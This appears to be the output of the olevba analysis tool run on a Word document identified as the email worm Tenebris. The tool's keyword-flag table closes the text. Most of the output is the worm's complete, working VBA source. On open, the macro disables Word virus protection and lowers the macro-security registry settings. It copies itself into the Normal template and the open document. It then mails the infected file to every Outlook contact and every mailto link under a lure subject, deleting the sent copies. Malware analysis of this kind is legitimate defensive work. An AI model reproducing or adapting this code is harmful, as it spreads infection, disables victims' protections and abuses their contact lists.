olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Tenebris-b6cb4a46137f79923d7bb7428d34d297b3c144fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Tenebris-b6cb4a46137f79923d7bb7428d34d297b3c144fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Email-Worm.MSWord.Tenebris-b6cb4a46137f79923d7bb7428d34d297b3c144fb - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macro.Word.Tenebris - By SAD1c
Private Sub AutoOpen()
On Error Resume Next
zero = 0
With Options
        .VirusProtection = zero
        .ConfirmConversions = zero
        .SaveNormalPrompt = zero
End With
CommandBars("Macro").Visible = zero
Set rk = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security"
System.PrivateProfileString("", rk, "Level") = 1&
System.PrivateProfileString("", rk, "AccessVBOM") = 1&
Set ad = ActiveDocument.VBProject.VBComponents(1)
Set td = ThisDocument.VBProject.VBComponents(1)
Set nt = NormalTemplate.VBProject.VBComponents(1)
If nt.Name <> "Tenebris" Then
        Set tdc = td.CodeModule
        Set ntc = nt.CodeModule
        ntc.DeleteLines 1, ntc.CountOfLines
        ntc.InsertLines 1, tdc.Lines(1, tdc.CountOfLines)
        nt.Name = "Tenebris"
        NormalTemplate.Save
End If
If ad.Name <> "Tenebris" Then
        Set tdc = td.CodeModule
        Set atc = ad.CodeModule
        atc.DeleteLines 1, atc.CountOfLines
        atc.InsertLines 1, tdc.Lines(1, tdc.CountOfLines)
        ad.Name = "Tenebris"
        ActiveDocument.Password = ""
        ActiveDocument.SaveAs ActiveDocument.FullName
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Tenebris", "Outlook") = "" Then
        Set out = CreateObject("Outlook.Application")
        Set list = out.GetNameSpace("MAPI").GetDefaultFolder(10).Items
        For count = 1 To list.count
                sendmail (list.Item(count))
        Next count
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Tenebris", "Outlook") = "Tenebris"
End If
For Each link In ActiveDocument.Hyperlinks
        If Left(link.address, 7) = "mailto:" Then
                sendmail (Mid(link.address, 8))
        End If
Next
If Month(Now) = 7 Then
        With Application.Assistant
                Set ball = .NewBalloon
                .On = True
                .Animation = msoAnimationGreeting
                ball.Heading = "Macro.Word.Tenebris"
                ball.Text = "Ex Tenebris Oritur Lux!"
                ball.Icon = msoIconTip
                ball.Show
        End With
End If
End Sub
Function sendmail(address)
        Set outlook = CreateObject("Outlook.Application")
        Set mail = outlook.CreateItem(0)
        With mail
                .To = address
                .Subject = "Very Important Document!"
                .Body = "Hi! Here  i've attached a word document that i think you will find interesting."
                .Body = mail.Body & vbcrlf & "Please tell me what do you think about it!" & vbcrlf & "Greetings."
                .Attachments.Add ActiveDocument.FullName
                .Importance = 2
                .DeleteAfterSubmit = True
                .Send
        End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

